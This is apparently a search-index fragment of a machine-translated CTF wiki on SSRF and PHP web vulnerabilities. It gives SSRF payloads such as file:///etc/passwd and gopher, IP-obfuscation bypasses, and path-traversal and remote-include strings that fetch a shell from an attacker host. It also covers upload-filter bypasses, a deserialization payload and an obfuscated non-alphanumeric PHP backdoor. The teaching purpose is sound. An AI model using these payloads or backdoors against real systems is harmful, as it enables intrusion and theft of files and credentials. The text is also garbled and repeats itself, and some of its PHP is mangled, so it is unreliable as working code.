\u24de \u24df \u24e0 \u24e1 \u24e2 \u24e3 \u24e4 \u24e5 \u24e6 \u24e7 \u24e8 \u24e9 \u24ea \u24eb \u24ec \u24ed \u24ee \u24ef \u24f0 \u24f1 \u24f2 \u24f3 \u24f4 \u24f5 \u24f6 \u24f7 \u24f8 \u24f9 \u24fa \u24fb \u24fc \u24fd \u24fe \u24ff Hazard \u00b6 You can scan the port on the external network, the intranet where the server is located, and the local port to obtain the banner information of some services. Attack applications running on intranet or local (such as overflow); Fingerprint recognition for intranet web applications, by accessing default files; Attacking internal and external web applications, mainly using get parameters to achieve attacks (such as struts2, sqti, etc.); Use the file protocol to read local files and so on. References \u00b6 [Build Your SSRF EXP Autowork] ( http://tools.40huo.cn/#!papers.md ) [Tencent SSRF vulnerability (very good use point) with script] (https:// thorns.gitbooks.io/sec/content/teng_xun_mou_chu_ssrf_lou_6d1e28_fei_chang_hao_de .html) [Bilibili a substation leaked from information to ssrf to command execution] (https://_thorns.gitbooks.io/sec/content/bilibilimou_fen_zhan_cong_xin_xi_xie_lu_dao_ssrf_z.html)","title":"SSRF Server Request Forgery"},{"location":"web/ssrf/#ssrf-introduction","text":"SSRF, Server-Side Request Forgery, server request forgery, is a vulnerability that is constructed by an attacker to form a request initiated by the server. In general, the target of an SSRF attack is an internal system that is inaccessible from the external network. The reason for the vulnerability is mostly because the server provides the function of obtaining data from other server applications and does not filter and limit the target address. There are five main types of attacks that an attacker can make using SSRF: You can perform port scanning on the external network, the intranet where the server is located, and local, and obtain banner information for some services. Attack applications running on intranet or local (such as overflow) Fingerprint recognition of the intranet WEB application, by accessing the default file Attack web applications inside and outside the network, mainly attacks that can be implemented using GET parameters (such as Struts2, sqti, etc.) Use the file protocol to read local files, etc.","title":"SSRF Introduction"},{"location":"web/ssrf/#ssrf-vulnerability-scenarios","text":"Where there is a possibility to initiate a network request, there may be an SSRF vulnerability Request resources from a remote server (Upload from URL, Import & Export RSS Feed) Database built-in functions (Oracle, MongoDB, MSSQL, Postgres, CouchDB) Webmail collects other emails (POP3, IMAP, SMTP) File processing, encoding processing, attribute information processing (ffmpeg, ImageMagic, DOCX, PDF, XML)","title":"SSRF Vulnerability scenarios"},{"location":"web/ssrf/#common-backend-implementation","text":"file_get_contents <?php if ( isset ( $_POST [ 'url' ])) { $content = file_get_contents ( $_POST [ 'url' ]); $filename = './images/' . rand () . ';img1.jpg' ; file_put_contents ( $filename , $content ); echo $_POST [ 'url' ]; $img = \"<img src= \\\" \" . $filename . \" \\\" />\" ; } echo $img ; ?> This code uses the file_get_contents function to get the image from the URL specified by the user. It is then saved to the hard disk with a random file name and presented to the user. fsockopen() <?php function GetFile ( $host , $port , $link ) { $fp = fsockopen ( $host , intval ( $port ), $errno , $errstr , 30 ); if ( ! $fp ) { echo \" $errstr (error number $errno ) \\n \" ; } else { $out = \"GET $link HTTP/1.1 \\r\\n \" ; $out .= \"Host: $host\\r\\n \" ; $out .= \"Connection: Close \\r\\n\\r\\n \" ; $out .= \" \\r\\n \" ; fwrite ( $fp , $out ); $contents = '' ; while ( ! feof ( $fp )) { $contents .= fgets ( $fp , 1024 ); } fclose ( $fp ); return $contents ; } } ?> This code uses the fsockopen function to get the data (file or HTML) from the user's URL. This function uses a socket to establish a TCP connection with the server to transfer raw data. curl_exec() <?php if ( isset ( $_POST [ 'url' ])) { $link = $_POST [ 'url' ]; $curlobj = curl_init (); curl_setopt ( $curlobj , CURLOPT_POST , 0 ); curl_setopt ( $curlobj , CURLOPT_URL , $link ); curl_setopt ( $curlobj , CURLOPT_RETURNTRANSFER , 1 ); $result = curl_exec ( $curlobj ); curl_close ( $curlobj ); $filename = './curled/' . rand () . '.txt' ; file_put_contents ( $filename , $result ); echo $result ; } ?> Use curl to get the data.","title":"Common backend implementation"},{"location":"web/ssrf/#scenarios-that-hinder-ssrf-exploits","text":"Server open OpenSSL cannot be used interactively The server needs authentication (Cookies & User: Pass) is not perfect The port that restricts requests is the commonly used port of http, for example, 80, 443, 8080, 8090. Disable unwanted protocols. Only http and https requests are allowed. Can prevent problems similar to file:///, gopher://, ftp://, etc. Unify the error message to prevent the user from judging the port status of the remote server based on the error message.","title":"Scenarios that hinder SSRF exploits"},{"location":"web/ssrf/#port-scanning-with-ssrf","text":"According to the return information of the server, most applications will not judge the port, and the status of the port can be judged by the returned banner information. Backend implementation <?php if ( isset ( $_POST [ 'url' ])) { $link = $_POST [ 'url' ]; $filename = './curled/' . rand () . 'txt' ; $curlobj = curl_init ( $link ); $fp = fopen ( $filename , \"w\" ); curl_setopt ( $curlobj , CURLOPT_FILE , $fp ); curl_setopt ( $curlobj , CURLOPT_HEADER , 0 ); curl_exec ( $curlobj ); curl_close ( $curlobj ); fclose ( $fp ); $fp = fopen ( $filename , \"r\" ); $result = fread ( $fp , filesize ( $filename )); fclose ( $fp ); echo $result ; } ?> Construct a front page < html > < body > < form name = \"px\" method = \"post\" action = \"http://127.0.0.1/ss.php\" > < input type = \"text\" name = \"url\" value = \"\" > < input type = \"submit\" name = \"commit\" value = \"submit\" > </ form > < script ></ script > </ body > </ html > Requesting a non-HTTP port can return banner information. Or you can use the 302 jump to bypass the limitations of the HTTP protocol. Auxiliary script <?php $ip = $_GET [ 'ip' ]; $port = $_GET [ 'port' ]; $scheme = $_GET [ 's' ]; $data = $_GET [ 'data' ]; header ( \"Location: $scheme :// $ip : $port / $data \" ); ?> [Tencent SSRF vulnerability (very good use point) with script] (https:// thorns.gitbooks.io/sec/content/teng_xun_mou_chu_ssrf_lou_6d1e28_fei_chang_hao_de .html)","title":"Port scanning with SSRF"},{"location":"web/ssrf/#agreement-utilization","text":"Dict agreement dict://fuzz.wuyun.org:8080/helo:dict Gopher protocol gopher://fuzz.wuyun.org:8080/gopher File protocol file:///etc/passwd","title":"Agreement Utilization"},{"location":"web/ssrf/#bypass-posture","text":"Change the IP address For example 192.168.0.1 octal format: 0300.0250.0.1 Hexadecimal format: 0xC0.0xA8.0.1 10-digit integer format: 3232235521 Hexadecimal integer format: 0xC0A80001 There is also a special omission mode, such as 10.0.0.1 which can be written as 10.1 Use the URL to resolve the problem In some cases, the backend program may parse the accessed URL and filter the resolved host address. At this time, the URL parameters may be parsed improperly, which may bypass the filtering. E.g: http://www.baidu.com@192.168.0.1/ and http://192.168.0.1 are all requested for 192.168.0.1 Can point to any ip domain name xip.io : http://127.0.0.1.xip.io/ ==> http://127.0.0.1/ Short address http://dwz.cn/11SMa ==> http://127.0.0.1 Use the period . : 127.0.0.1 ==> 127.0.0.1 \u5229\u7528Enclosed alphanumerics \u24d4\u24e7\u24d0\u24dc\u24df\u24db\u24d4.\u24d2\u24de\u24dc >>> example.com List: \u2460 \u2461 \u2462 \u2463 \u2464 \u2465 \u2466 \u2467 \u2468 \u2469 \u246a \u246b \u246c \u246d \u246e \u246f \u2470 \u2471 \u2472 \u2473 \u2474 \u2475 \u2476 \u2477 \u2478 \u2479 \u247a \u247b \u247c \u247d \u247e \u247f \u2480 \u2481 \u2482 \u2483 \u2484 \u2485 \u2486 \u2487 \u2488 \u2489 \u248a \u248b \u248c \u248d \u248e \u248f \u2490 \u2491 \u2492 \u2493 \u2494 \u2495 \u2496 \u2497 \u2498 \u2499 \u249a \u249b \u249c \u249d \u249e \u249f \u24a0 \u24a1 \u24a2 \u24a3 \u24a4 \u24a5 \u24a6 \u24a7 \u24a8 \u24a9 \u24aa \u24ab \u24ac \u24ad \u24ae \u24af \u24b0 \u24b1 \u24b2 \u24b3 \u24b4 \u24b5 \u24b6 \u24b7 \u24b8 \u24b9 \u24ba \u24bb \u24bc \u24bd \u24be \u24bf \u24c0 \u24c1 \u24c2 \u24c3 \u24c4 \u24c5 \u24c6 \u24c7 \u24c8 \u24c9 \u24ca \u24cb \u24cc \u24cd \u24ce \u24cf \u24d0 \u24d1 \u24d2 \u24d3 \u24d4 \u24d5 \u24d6 \u24d7 \u24d8 \u24d9 \u24da \u24db \u24dc \u24dd \u24de \u24df \u24e0 \u24e1 \u24e2 \u24e3 \u24e4 \u24e5 \u24e6 \u24e7 \u24e8 \u24e9 \u24ea \u24eb \u24ec \u24ed \u24ee \u24ef \u24f0 \u24f1 \u24f2 \u24f3 \u24f4 \u24f5 \u24f6 \u24f7 \u24f8 \u24f9 \u24fa \u24fb \u24fc \u24fd \u24fe \u24ff","title":"Bypass posture"},{"location":"web/ssrf/#hazard","text":"You can scan the port on the external network, the intranet where the server is located, and the local port to obtain the banner information of some services. Attack applications running on intranet or local (such as overflow); Fingerprint recognition for intranet web applications, by accessing default files; Attacking internal and external web applications, mainly using get parameters to achieve attacks (such as struts2, sqti, etc.); Use the file protocol to read local files and so on.","title":"Hazard"},{"location":"web/ssrf/#references","text":"[Build Your SSRF EXP Autowork] ( http://tools.40huo.cn/#!papers.md ) [Tencent SSRF vulnerability (very good use point) with script] (https:// thorns.gitbooks.io/sec/content/teng_xun_mou_chu_ssrf_lou_6d1e28_fei_chang_hao_de .html) [Bilibili a substation leaked from information to ssrf to command execution] (https://_thorns.gitbooks.io/sec/content/bilibilimou_fen_zhan_cong_xin_xi_xie_lu_dao_ssrf_z.html)","title":"References"},{"location":"web/php/php/","text":"File contains \u00b6 Common functions that cause files to be included are: PHP\uff1a include() \uff0c include_once() \uff0c require() \uff0c require_once() \uff0c fopen() \uff0c readfile() \u7b49 JSP Servlet \uff1a ava.io.File () \uff0c java.io.FileReader () \u7b49 ASP\uff1a includefile \uff0c includevirtual \u7b49 When PHP includes a file, it will be executed as PHP code, regardless of the type of file. Local file contains \u00b6 The local file contains, Local File Inclusion, LFI. <?php $file = $_GET [ 'file' ]; if ( file_exists ( '/home/wwwrun/' . $file . '.php' )) { include '/home/wwwrun/' . $file . '.php' ; } ?> The above code has a local file containing, and the contents of the /etc/passwd file can be read by truncating %00. %00 truncation ?file=../../../../../../../../../etc/passwd%00 Requires magic_quotes_gpc=off , PHP is less than 5.3.4. Path length truncation ?file=../../../../../../../../../etc/passwd/././././././.[\u2026]/./././././. Linux requires a file name longer than 4096 and Windows needs to be longer than 256. Point number truncation ``` ? file = ... / ... // ... // ... // ... / / boot.ini/ \u2026\u2026\u2026 [...] \u2026\u2026\u2026\u2026 ``` For Windows only, the dot number needs to be longer than 256. Remote file contains \u00b6 The remote file contains, Remote File Inclusion, RFI. <?php if ( $route == \"share\" ) { require_once $basePath . \"/action/m_share.php\" ; } elseif ( $ route == & quot ; sharelink & quot ;) { require_once $basePath . \"/action/m_sharelink.php\" ; } Constructs the value of the variable basePath . /?basePath=http://attacker/phpshell.txt? The final code is executed require_once \"http://attacker/phpshell.txt?/action/m_share.php\"; The part after the question mark is interpreted as the querystring of the URL, which is also a kind of \"truncation\". Normal remote file contains ?file=[http|https|ftp]://example.com/shell.txt Need allow_url_fopen=On and allow_url_include=On . Utilize PHP stream input ?file=php://input \u9700\u8981 allow_url_include=On \u3002 Utilize PHP stream filter ?file=php://filter/convert.base64-encode/resource=index.php \u9700\u8981 allow_url_include=On \u3002 -Use data URIs ?file=data://text/plain;base64,SSBsb3ZlIFBIUAo= \u9700\u8981 allow_url_include=On \u3002 Execute with XSS ?file=http://127.0.0.1/path/xss.php?xss=phpcode Need allow_url_fopen=On , allow_url_include=On and the firewall or whitelist is not allowed to access the external network, first find an XSS vulnerability in the same site, including this page, you can inject malicious code. File Upload \u00b6 A file upload vulnerability is when a user uploads an executable script file and obtains the ability to execute server-side commands through this file. In most cases, file upload vulnerabilities generally refer to the problem of uploading a web script that can be parsed by the server, a so-called webshell issue. To complete this attack, several conditions are required. First, the uploaded file can be executed by the WEB container. Secondly, the user can access the file from the WEB. Finally, if the uploaded file is changed by security check, formatting, image compression, etc. Content may cause the attack to fail. Bypassing the upload check \u00b6 Front end check extension Capture the package and bypass it. Content-Type detection file type Capture the package to modify the Content-Type type to match the whitelist rules. Add a suffix to the server Try %00 truncation. Server extension detection Exploit the vulnerability. Apache parsing phpshell.php.rar.rar.rar.rar Because Apache does not know .rar this file type, so it will traverse the suffix to .php , and then think this is a PHP file. IIS parsing When the file name is abc.asp;xx.jpg under IIS 6, it will be parsed as abc.asp . PHP CGI path resolution When you visit http://www.a.com/path/test.jpg/notexist.php , test.jpg will be parsed as PHP, and notexist.php is a non-existent file. At this point, the configuration of Nginx is as follows location ~ \\.php$ { root html ; fastcgi_pass 127.0.0.1 : 9000 ; fastcgi_index index.php ; fastcgi_param SCRIPT_FILENAME /scripts $fastcgi_script_name ; include fastcgi_param ; } other methods The suffix case, double write, special suffix such as php5 , etc., modify the content of the package to the WAF and so on. Variable coverage \u00b6 Global Variable Override \u00b6 Variables that are not initialized and can be controlled by the user are likely to cause security problems. ` this register_globals = ON Example ```php <?php echo &quot;Register_globals:&quot;. (int) ini_get (&quot;register_globals&quot;). &quot; <br/> &quot;; if ($auth) { echo \"private!\"; } ?> When register_globals=ON , submit test.php?auth=1 , the auth variable will be automatically assigned. extract() variable override \u00b6 The extract() function can import variables from an array into the current symbol table, which is defined as int extract ( array $var_array [, int $extract_type [, string $prefix ]] ) The second parameter specifies the behavior of the function when it is imported into the symbol table. The two most common values are EXTR_OVERWRITE and EXTR_SKIP . When the value is EXTR_OVERWRITE , in the process of importing variables into the symbol table, if the variable name conflicts, all variables are overwritten; the value of 'EXTR_SKIP means skipping without overwriting. If the second parameter is not specified, EXTR_OVERWRITE` is used by default. <?php $auth = \"0\" ; extract ( $_GET ); if ( $auth == 1 ) { echo \"private!\" ; } else { echo \"public!\" ; } ?> Variable coverage can occur when the extract() function exports variables from an array that the user can control. import_request_variables Variable Override \u00b6 bool import_request_variables (string $types [, string $prefix]) import_request_variables Imports variables from GET, POST, and Cookies into the global. Use this function to simply specify the type. <?php $auth = \"0\" ; import_request_variables ( \"G\" ); if ( $auth == 1 ) { echo \"private!\" ; } else { echo \"public!\" ; } ?> import_request_variables(&quot;G&quot;) specifies the variables to be imported into the GET request, and submits the test coverage of test.php?auth=1 . parse_str() variable override \u00b6 void parse_str ( string $str [, array &$arr ]) The parse_str() function is usually used to parse the querystring in a URL, but when the parameter value can be controlled by the user, it is likely to cause variable coverage. // var.php?var=new variable override $ var = &quot;init&quot;; parse_str($_SERVER[\"QUERY_STRING\"]); print $ var; Functions similar to parse_str() also have mb_parse_str() . Command Execution \u00b6 Direct execution code \u00b6 There are quite a few functions in PHP that can execute code directly. eval(); assert(); system(); exec(); shell_exec(); passthru(); escapeshellcmd(); pcntl_exec(); ...... preg_replace() Code Execution \u00b6 The first argument to preg_replace() allows code execution if the /e mode modifier is present. <?php $ var = & quot ; < tag > phpinfo () </ tag > & quot ;; preg_replace ( & quot ; / < tag > ( . *? ) & lt ; / tag & gt ; / e & quot ;, & quot ; addslashes ( 1 ) & quot ;, $ var ); ?> If you don't have the /e modifier, you can try %00 truncation. preg_match Code Execution \u00b6 preg_match performs a matching regular expression, allowing the code to execute if the match is successful. <?php include 'flag.php'; if(isset($_GET['code'])){ $code = $_GET['code']; if(strlen($code)>40){ die(\"Long.\"); } if(preg_match(\"/[A-Za-z0-9]+/\",$code)){ die(\"NO.\"); } @eval($code); }else{ highlight_file(__FILE__); } //$hint = \"php function getFlag() to get flag\"; ?> This question is a question from the plum wine master when the xman training session. This series of code descriptions is like this. We want to bypass the passing of regular numbers and alphabetic strings such as AZ , az , 0-9 , and convert non-alphanumeric characters into various transformations. Can construct any character in az , and the string length is less than 40 . Then use PHP to allow dynamic function execution features, stitch out a function name, here we are getFlag , and then dynamically execute the code. So, the question we need to consider is how to pass various transformations so that we can successfully read the getFlag function and get the webshell . Before we understand this, we first need to understand the concept of XOR ^ in PHP . Let's take a look at the following code: <?php echo &quot;A&quot; ^ &quot;?&quot;; ?> The results are as follows: We can see that the output is the character ~ . The reason for this is because the code A and the character ? are XORed in the code. In PHP , when two variables are XORed, the string is first converted to an ASCII value, then the ASCII value is converted to binary and then XORed, XOR is completed, and the result is converted from binary. Become an ASCII value and convert the ASCII value to a string. XOR operations are also sometimes used to exchange the values of two variables. Like the example above The ASCII value of A is 65 and the corresponding binary value is 01000001 . The ASCII value of ? is 63 and the corresponding binary value is 00111111 . The value of the exclusive OR binary is \u202d01111110\u202c , the corresponding ASCII value is 126 , and the corresponding string value is ~ . We all know that PHP is a weakly typed language, that is, in PHP we can declare a variable directly and initialize or assign it without declaring the type of the variable. It is precisely because of the PHP weak type that we implicitly convert the variable type of PHP and use this feature to perform some unconventional operations. If you convert an integer to a string, treat a boolean as an integer, or treat a string as a function, let's look at a piece of code: <?php function B(){ echo \"Hello Angel_Kitty\"; } $_++; $__= \"?\" ^ \"}\"; $__(); ?> The code execution results are as follows: Let's analyze the above code together: 1, $_++; This line of code means to increment the variable named &quot;_&quot; , the default value of the variable undefined in PHP null , null== False==0 , we can get a number by auto-incrementing the undefined variable without using any numbers. 2, $__=&quot;?&quot; ^ &quot;}&quot;; XOR the characters ? and } , and get the result B assigned to the variable named __ (two underscores) 3, $ __ (); Through the above assignment operation, the value of the variable $__ is B , so this line can be regarded as B() . In PHP , this line of code represents The function B is called, so the result is Hello Angel_Kitty . In PHP , we can treat strings as functions. Seeing this, I believe that if you see a similar PHP backdoor, you should not be so confused. You can use the sentence analysis of the backdoor code to understand the functions that the backdoor wants to achieve. We want to use this backdoor to create strings that bypass the detection and are useful to us, such as _POST , system , call_user_func_array , or whatever we need. Here is a very simple non-alphanumeric PHP backdoor: <?php @$_++; // $_ = 1 $__=(\"#\"^\"|\"); // $__ = _ $__.=(\".\"^\"~\"); // _P $ __. = (&quot;/&quot; ^ &quot;` &quot;); // _PO $ __. = (&quot;|&quot; ^ &quot;/&quot;); // _POS $__.=(\"{\"^\"/\"); // _POST ${$__}[!$_](${$__}[$_]); // $_POST[0]($_POST[1]); ?> Here I explain, .= is a string connection, see PHP syntax for details. We can even merge the above code into one line, making the program less readable, the code is as follows: $__=(\"#\"^\"|\").(\".\"^\"~\").(\"/\"^\"`\").(\"|\"^\"/\").(\"{\"^\"/\"); Looking back at the question of the xman training, our idea is to bypass the string of characters by constructing XOR, so how do we construct this string so that the length is less than 40 ? We finally want to read the getFlag function, we need to construct a _GET to read this function, we finally construct the following string: It may be that many small partners still can't understand how this string is constructed. Let's analyze the segment string. Construct _GET Read \u00b6 First of all, we have to know what X_GET` is from XOR. After my attempts and analysis, I came to the following conclusion: <?php echo \"`{{{\"^\"?<>/\";//_GET ?> What is the meaning of this code? Because of the 40-character length limit, webshells that were previously XOR-to-character-spliced cannot be used. Here you can use the backquotes ` and Linux under the php php to execute the command ? ? means matching one character ` indicates execution of the command ` Parsing a special string Since ? can only match one character, this way of writing means looping and matching. We will break it down to see: <?php echo \"{\"^\"<\"; ?> The output is: <?php echo \"{\"^\">\"; ?> The output is: <?php echo \"{\"^\"/\"; ?> The output is: So we can know that _GET is constructed like this! Get the _GET parameter \u00b6 How do we get the _GET parameter? We can construct the following string: <?php echo ${$_}[_](${$_}[__]);//$_GET[_]($_GET[__]) ?> According to the previous construction, $_ has become _GET . Naturally, $_ = _GET . We built $_GET[__] to get the parameter values. Incoming parameters \u00b6 At this point we just need to call the getFlag function to get the webshell just fine, constructed as follows: <?php echo $_=getFlag;//getFlag ?> So connect all the parameters and you're done. The results are as follows: So we successfully read the flag! Dynamic function execution \u00b6 User-defined functions can lead to code execution. <?php $ dyn_func = $ _GET [ & quot ; dyn_func & quot ;]; $argument = $_GET [ \"argument\" ]; $ dyn_func ( $ argument ); ?> Backquote command execution \u00b6 <?php echo `ls -al` ; ?> Curly Syntax \u00b6 PHP's Curly Syntax can also lead to code execution, it will execute the code between the curly braces and replace the results. <?php $ var = & quot ; aaabbbccc $ { ` ls` } & quot ;; ?> <?php $foobar = \"phpinfo\" ; $ { & quot ; foobar & quot ;} (); ?> Callback \u00b6 Many functions can execute callback functions, which will cause code execution when the callback function is controllable by the user. <?php $evil_callback = $_GET [ \"callback\" ]; $some_array = array ( 0 , 1 , 2 , 3 ); $new_array = array_map ( $evil_callback , $some_array ); ?> Attack payload http://www.a.com/index.php?callback=phpinfo Deserialization \u00b6 If unserialize() defines a __destruct() or __wakeup() function at execution time, it may cause code execution. <?php class Example { was $ var = & quot ; & quot ;; function __destruct () { eval ( $this -> var ); } } unserialize ( $_GET [ \"saved_code\" ]); ?> Attack payload http://www.a.com/index.php?saved_code=O:7:\"Example\":1:{s:3:\"var\";s:10:\"phpinfo();\";} PHP Features \u00b6 Array \u00b6 <?php $ var = 1 ; $ var = array (); $ var = & quot ; string & quot ;; ?> Php does not strictly check incoming variable types, nor can it convert types freely. For example, in the comparison of $a == $b $a = null; $b = false; // is true $a = ''; $b = 0; //also true However, the developers of the PHP kernel originally wanted to let programmers develop more efficiently with this system that does not require declarations, so many loosely used comparisons and transformations were used in almost all built-in functions and basic structures to prevent programs from being used. The variables are frequently reported incorrectly because of the programmer's irregularity, but this brings security problems. 0=='0' //true 0 == 'abcdefg' //true 0 === 'abcdefg' //false 1 == '1abcdef' //true Magic Hash \u00b6 \"0e132456789\"==\"0e7124511451155\" //true \"0e123456abc\"==\"0e1dddada\" //false \"0e1abc\"==\"0\" //true When a comparison operation is performed, if a string such as 0e\\d+ is encountered, the string is parsed into scientific notation. So the values of the two numbers in the above example are all 0 and thus equal. If the pattern of 0e\\d+ is not satisfied, it will not be equal. hex conversion \u00b6 \"0x1e240\"==\"123456\" //true \"0x1e240\"==123456 //true \"0x1e240\"==\"1e240\" //false When one of the strings starts with 0x , PHP parses the string into decimal and then compares it. 0x1240 parsing into decimal is 123456, so with the int type and the string type of 123456 The comparisons are all equal. Type conversion \u00b6 The common conversions are mainly int converted to string , string converted to int . int turn string $ var = 5; Method 1: $item = (string) $var; Method 2: $item = strval($var); string turns int : intval() function. For this function, you can look at 2 examples first. var_dump (intval (&#39;2&#39;)) // 2 var_dump (intval (&#39;3abcd&#39;)) // 3 var_dump (intval (&#39;abcd&#39;)) // 0 When the intval() conversion is specified, it will be converted from the beginning of the string to know that a non-numeric character has been encountered. Even if there is a string that cannot be converted, intval() will not report an error but return 0. At the same time, programmers should not use the following code when programming: if(intval($a)>1000) { mysql_query(\"select * from news where id=\".$a) } At this time, the value of $a may be 1002 union . Looseness of parameters of built-in functions \u00b6 The looseness of the built-in function is that when the function is called, the function is passed to the function type that the function cannot accept. Explain a bit of a mouthful, or directly through the actual examples to illustrate the problem, the following will focus on a few of these functions. md5() $array1[] = array( \"foo\" => \"bar\", \"bar\" => \"foo\", ); $array2 = array(\"foo\", \"bar\", \"hello\", \"world\"); var_dump (md5 ($ array1) == md5 ($ array2)); //threaten The description of the md5() function in the PHP manual is string md5 ( string $str [, bool $raw_output = false ] ) , and the requirement in md5() is a string type parameter. But when you pass an array, md5() will not report an error, but will not be able to correctly find the md5 value of the array, which will cause the md5 values of any 2 arrays to be equal. strcmp() The strcmp() function is described in the official PHP manual as intstrcmp ( string $str1 , string $str2 ) , which needs to pass 2 arguments of type string to strcmp() . If str1 is less than str2 , it returns -1, and equality returns 0, otherwise it returns 1. The essence of the strcmp() function to compare strings is to convert two variables to ASCII, then perform the subtraction, and then determine the return value based on the result of the operation. What if the argument that gives strcmp() is a number? $array=[1,2,3]; Var_dump(strcmp($array,&#39;123&#39;)); //null, in a sense null is equivalent to false. switch() If switch() is a case of a numeric type, switch will convert the parameters to an int. as follows: $i =\"2abc\"; switch ($i) { case 0: case 1: case 2: echo \"i is less than 3 but not negative\"; break; case 3: echo \"i is 3\"; } At this time, the program outputs i is less than 3 but not negative because the switch() function converts $i and the result is 2. in_array() In the PHP manual, the in_array() function is interpreted as bool in_array ( mixed $needle , array $haystack [, bool $strict = FALSE ] ) . If the strict parameter is not provided, then in_array will be loose. Compare to see if $needle is in $haystack . When the value of strict is true, in_array() compares the type of needls with the type in haystack. $array=[0,1,2,'3']; var_dump(in_array('abc', $array)); //true var_dump(in_array('1bc', $array)); //true You can see that the above case returns true, because &#39;abc&#39; will be converted to 0, and &#39;1bc&#39; will be converted to 1. array_search() is the same as in_array() . Looking for source code backup \u00b6 hg Source code leak \u00b6 `hg files are generated when hg init . [Using the tool dvcs-ripper] ( https://github.com/kost/dvcs-ripper ) Git Source leaks \u00b6 The .git directory contains files such as code change records. If the files in this directory are accessible when deployed, they may be used to restore the source code. /.git /.git/HEAD /.git/index /.git/config /.git/description GitHack python GitHack.py http://www.openssl.org/.git/ [GitHacker (Recoverable Full Git Repository)] ( https://github.com/WangYihang/GitHacker ) python GitHacker.py http://www.openssl.org/.git/ .DS_Store File leaked \u00b6 Mac OS will contain a .DS_Store file containing information such as the file name. [Using the tool ds_store_exp] ( https://github.com/lijiejie/ds_store_exp ) python ds_store_exp.py http://hd.zj.qq.com/themes/galaxyw/.DS_Store hd.zj.qq.com/ \u2514\u2500\u2500 themes Axy\u2500\u2500 galaxyw \u251c\u2500\u2500 app \u2502 \u2514\u2500\u2500 css \u2502 \u2514\u2500\u2500 style.min.css \u251c\u2500\u2500 cityData.min.js \u251c\u2500\u2500 images \u2502 \u2514\u2500\u2500 img \u2502 \u251c\u2500\u2500 bg-hd.png \u2502 \u251c\u2500\u2500 bg-item-activity.png \u2502 \u251c\u2500\u2500 bg-mask-pop.png \u2502 \u251c\u2500\u2500 btn-bm.png \u2502 \u251c\u2500\u2500 btn-login-qq.png \u2502 \u251c\u2500\u2500 btn-login-wx.png \u2502 \u251c\u2500\u2500 ico-add-pic.png \u2502 \u251c\u2500\u2500 ico-address.png \u2502 \u251c\u2500\u2500 ico-bm.png \u2502 \u251c\u2500\u2500 ico-duration-time.png \u2502 \u251c\u2500\u2500 ico-pop-close.png \u2502 \u251c\u2500\u2500 ico-right-top-delete.png \u2502 \u251c\u2500\u2500 page-login-hd.png \u2502 \u251c\u2500\u2500 pic-topeng.png \u2502 \u2514\u2500\u2500 ticket-selected.png \u2514\u2500\u2500 member \u251c\u2500\u2500 assets \u2502 \u251c\u2500\u2500 css \u2502 \u2502 \u251c\u2500\u2500 ace-reset.css \u2514 \u2514\u2500\u2500 antd.css \u2502 \u2514\u2500\u2500 lib \u2502 \u251c\u2500\u2500 cityData.min.js \u2502 \u2514\u2500\u2500 ueditor \u2502 \u251c\u2500\u2500 index.html \u2502 \u251c\u2500\u2500 lang Zh-\u2502 \u2502 \u2514\u2500\u2500 \u2502 \u2502 \u251c\u2500\u2500 images \u2502 \u2502 \u2502 \u251c\u2500\u2500 copy.png \u2502 \u2502 \u2502 \u251c\u2500\u2500 localimage.png \u2502 \u2502 \u2502 \u251c\u2500\u2500 music.png \u2502 \u2502 \u2502 \u2514\u2500\u2500 upload.png \u2502 \u2502 \u2514\u2500\u2500 zh cn.js \u2502 \u251c\u2500\u2500 php \u2502 \u2502 \u251c\u2500\u2500 action_crawler.php \u2502 \u2502 \u251c\u2500\u2500 action_list.php \u2502 \u2502 \u251c\u2500\u2500 action_upload.php \u2502 \u2502 \u251c\u2500\u2500 config.json \u2502 \u2502 \u251c\u2500\u2500 controller.php \u2502 \u2502 \u2514\u2500\u2500 Uploader.class.php \u2502 \u251c\u2500\u2500 ueditor.all.js \u2502 \u251c\u2500\u2500 ueditor.all.min.js \u2502 \u251c\u2500\u2500 ueditor.config.js \u2502 \u251c\u2500\u2500 ueditor.parse.js \u2502 \u2514\u2500\u2500 ueditor.parse.min.js \u2514\u2500\u2500 static \u251c\u2500\u2500 css \u2502 \u2514\u2500\u2500 page.css \u251c\u2500\u2500 img \u2502 \u251c\u2500\u2500 bg-table-title.png \u2502 \u251c\u2500\u2500 bg-tab-say.png \u2502 \u251c\u2500\u2500 ico-black-disabled.png \u2502 \u251c\u2500\u2500 ico-black-enabled.png \u2502 \u251c\u2500\u2500 ico-coorption-person.png \u2502 \u251c\u2500\u2500 ico-miss-person.png \u2502 \u251c\u2500\u2500 ico-mr-person.png \u2502 \u251c\u2500\u2500 ico-white-disabled.png \u2502 \u2514\u2500\u2500 ico-white-enabled.png \u2514\u2500\u2500 scripts \u251c\u2500\u2500 js \u2514\u2500\u2500 lib \u2514\u2500\u2500 jquery.min.js 21 directories, 48 files Website backup file \u00b6 The administrator incorrectly placed the backup under the web directory after backing up the website file. Common suffixes: .rar .zip 7.z tar .tar.gz .behind .txt SVN Leak \u00b6 Sensitive documents: /.svn /.svn/wc.db /.svn/entries dvcs-ripper perl rip-svn.pl -v -u http://www.example.com/.svn/ [Seay - SVN] ( http://tools.40huo.cn/#!web.md# source leak) WEB-INF / web.xml leaked \u00b6 WEB-INF is a secure directory for Java web applications, and there are file mappings in web.xml. WEB-INF mainly contains the following files or directories: /WEB-INF/web.xml : Web application configuration file that describes the servlet and other application component configuration and naming rules. /WEB-INF/classes/ : Contains all the class files used by the site, including servlet class and non-servlet class, they cannot be included. In the jar file. /WEB-INF/lib/ : Stores various jar files required by the web application, and places jar files that are only required in this application, such as database driver jar files. /WEB-INF/src/ : source directory, each java file is placed according to the package name structure. /WEB-INF/database.properties : Database configuration file. By finding the web.xml file, inferring the path to the class file, and finally by directly classifying the file, the website source code is obtained by decompiling the class file. In general, the jsp engine is forbidden to access the WEB-INF directory by default. When Nginx works with Tomcat to balance load or cluster, the cause of the problem is actually very simple. Nginx will not consider configuring other type engines (Nginx is not a jsp engine). The security issue is introduced into its own security specification (so that the coupling is too high), modifying the Nginx configuration file to block access to the WEB-INF directory is fine: Location ~ ^/WEB-INF/* { deny all ; } # or return 404; or other! CVS Leak \u00b6 Http://url/CVS/Root returns the root information Http://url/CVS/Entries returns the structure of all files Retrieve source code bk clone http://url/name dir references \u00b6 Remember the pit that the webshell stepped on (how to write a backdoor that does not contain numbers and letters in PHP)","title":"PHP Code Auditing"},{"location":"web/php/php/#file-contains","text":"Common functions that cause files to be included are: PHP\uff1a include() \uff0c include_once() \uff0c require() \uff0c require_once() \uff0c fopen() \uff0c readfile() \u7b49 JSP Servlet 